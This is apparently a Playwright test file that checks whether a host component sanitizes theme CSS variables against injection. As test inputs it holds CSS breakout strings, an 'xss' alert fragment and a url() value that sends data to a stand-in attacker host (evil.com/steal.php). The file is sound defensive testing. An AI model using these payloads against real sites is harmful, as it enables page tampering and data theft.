import { test, expect } from '@playwright/test';
import { ReferenceHost } from '../src';

/**
 * Test CSS sanitization to prevent injection attacks
 */
test.describe('CSS Injection Prevention', () => {

  test('sanitizes malicious CSS in theme values', async ({ page }) => {
    // Create a simple inline app that uses CSS variables
    const inlineApp = `data:text/html,${encodeURIComponent(`
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body {
            background: var(--background);
            color: var(--foreground);
          }
        </style>
      </head>
      <body>
        <div id="test">Test Content</div>
      </body>
      </html>
    `)}`;

    // Attempt to inject malicious CSS that tries to break out of the style context
    const host = await ReferenceHost.launch(page, inlineApp, {
      theme: {
        '--background': '#000}; body { display: none; } /*',
        '--foreground': '#fff"; script: alert("xss")',
        '--malicious': '}; background: url("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="); /*',
      },
      sandbox: 'allow-scripts allow-same-origin',
    });

    // If the CSS is properly escaped, the body should still be visible
    const frame = host.getAppFrame();
    await expect(frame.locator('#test')).toBeVisible();
    
    // Check that the malicious CSS didn't execute by verifying body is not hidden
    const displayStyle = await frame.locator('body').evaluate((el) =>
      getComputedStyle(el).display
    );
    expect(displayStyle).not.toBe('none');

    await host.cleanup();
  });

  test('filters out non-CSS-variable keys', async ({ page }) => {
    const inlineApp = `data:text/html,${encodeURIComponent(`
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body {
            background: var(--background, red);
          }
        </style>
      </head>
      <body>
        <div id="test">Test Content</div>
      </body>
      </html>
    `)}`;

    // Try to inject CSS without the -- prefix (should be filtered out)
    const host = await ReferenceHost.launch(page, inlineApp, {
      theme: {
        '--background': '#000',
        'malicious-property': 'value; } body { display: none; } /*',
        'another-bad-key': 'bad-value',
      },
      sandbox: 'allow-scripts allow-same-origin',
    });

    const frame = host.getAppFrame();
    await expect(frame.locator('#test')).toBeVisible();
    
    // Verify body is still visible (malicious properties were filtered)
    const displayStyle = await frame.locator('body').evaluate((el) =>
      getComputedStyle(el).display
    );
    expect(displayStyle).not.toBe('none');

    await host.cleanup();
  });

  test('allows legitimate CSS values with escaped characters', async ({ page }) => {
    const inlineApp = `data:text/html,${encodeURIComponent(`
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body {
            background: var(--background);
            color: var(--foreground);
          }
        </style>
      </head>
      <body>
        <div id="test">Test Content</div>
      </body>
      </html>
    `)}`;

    const host = await ReferenceHost.launch(page, inlineApp, {
      theme: {
        '--background': '#1e1e2e',
        '--foreground': '#cdd6f4',
      },
      sandbox: 'allow-scripts allow-same-origin',
    });

    // The theme CSS is injected into the host page's :root
    // Check the host page (not the iframe) for the CSS variable
    const bgVar = await page.locator('html').evaluate((el) =>
      getComputedStyle(el).getPropertyValue('--background').trim()
    );
    expect(bgVar).toBe('#1e1e2e');

    await host.cleanup();
  });

  test('prevents url() and calc() injection attacks', async ({ page }) => {
    const inlineApp = `data:text/html,${encodeURIComponent(`
      <!DOCTYPE html>
      <html>
      <body>
        <div id="test">Test Content</div>
      </body>
      </html>
    `)}`;

    // Attempt url() and calc() injection
    const host = await ReferenceHost.launch(page, inlineApp, {
      theme: {
        '--malicious-url': 'url("http://evil.com/steal.php?data=")',
        '--malicious-calc': 'calc(100% - 10px); background: red',
        '--with-comments': 'red /* comment */ blue',
      },
      sandbox: 'allow-scripts allow-same-origin',
    });

    const frame = host.getAppFrame();
    await expect(frame.locator('#test')).toBeVisible();

    await host.cleanup();
  });
});
